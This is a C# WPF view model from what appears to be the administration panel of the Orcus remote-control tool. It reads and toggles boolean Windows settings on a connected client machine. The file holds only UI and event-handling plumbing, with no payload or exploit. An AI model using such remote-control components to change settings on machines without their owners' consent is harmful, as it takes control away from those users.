using System;
using System.Windows;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using Orcus.Administration.Commands.WindowsCustomizer;
using Orcus.Administration.Core.CommandManagement.View;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Administration.ViewModels.Extensions;
using Orcus.Shared.Commands.WindowsCustomizer;
using Sorzus.Wpf.Toolkit;

namespace Orcus.Administration.ViewModels.CommandViewModels
{
    [MinimumClientVersion(10)]
    public class WindowsCustomizerViewModel : CommandView
    {
        private RelayCommand _changePropertyRequestCommand;
        private CurrentSettings _currentSettings;
        private WindowsCustomizerCommand _windowsCustomizerCommand;

        public override string Name { get; } = (string) Application.Current.Resources["WindowsCustomizer"];
        public override Category Category { get; } = Category.System;

        public CurrentSettings CurrentSettings
        {
            get { return _currentSettings; }
            set { SetProperty(value, ref _currentSettings); }
        }

        public RelayCommand ChangePropertyRequestCommand
        {
            get
            {
                return _changePropertyRequestCommand ?? (_changePropertyRequestCommand = new RelayCommand(parameter =>
                {
                    var request = (CheckedChangeRequest) parameter;
                    var propertyName = (string) request.Parameter;
                    var propertyInfo = typeof (CurrentSettings).GetProperty(propertyName);
                    if ((bool) propertyInfo.GetValue(CurrentSettings, null) == request.RequestedStatus)
                    {
                        request.AcceptRequest();
                        return;
                    }

                    EventHandler<BooleanPropertyChangedEventArgs> handler = null;
                    EventHandler<BooleanPropertyChangedEventArgs> errorHandler = null;

                    handler = (sender, args) =>
                    {
                        if (args.Name == propertyName && request.RequestedStatus == args.Value)
                        {
                            Application.Current.Dispatcher.BeginInvoke(request.AcceptRequest);
                            _windowsCustomizerCommand.BooleanPropertyChanged -= handler;
                            _windowsCustomizerCommand.BooleanPropertyChangedError -= errorHandler;
                        }
                    };

                    errorHandler = (sender, args) =>
                    {
                        if (args.Name == propertyName && request.RequestedStatus == args.Value)
                        {
                            _windowsCustomizerCommand.BooleanPropertyChanged -= handler;
                            _windowsCustomizerCommand.BooleanPropertyChangedError -= errorHandler;
                        }
                    };

                    _windowsCustomizerCommand.BooleanPropertyChanged += handler;
                    _windowsCustomizerCommand.BooleanPropertyChangedError += errorHandler;

                    _windowsCustomizerCommand.ChangeBooleanProperty(propertyName, request.RequestedStatus);
                }));
            }
        }

        protected override void InitializeView(IClientController clientController, ICrossViewManager crossViewManager)
        {
            _windowsCustomizerCommand = clientController.Commander.GetCommand<WindowsCustomizerCommand>();
            _windowsCustomizerCommand.CurrentSettingsReceived += WindowsCustomizerCommandOnCurrentSettingsReceived;
        }

        protected override ImageSource GetIconImageSource()
        {
            return new BitmapImage(new Uri("pack://application:,,,/Resources/Images/VisualStudio/ConfigureComputer.ico", UriKind.Absolute));
        }

        public override void LoadView(bool loadData)
        {
            _windowsCustomizerCommand.GetCurrentSettings();
        }

        private void WindowsCustomizerCommandOnCurrentSettingsReceived(object sender, CurrentSettings currentSettings)
        {
            CurrentSettings = currentSettings;
        }
    }
}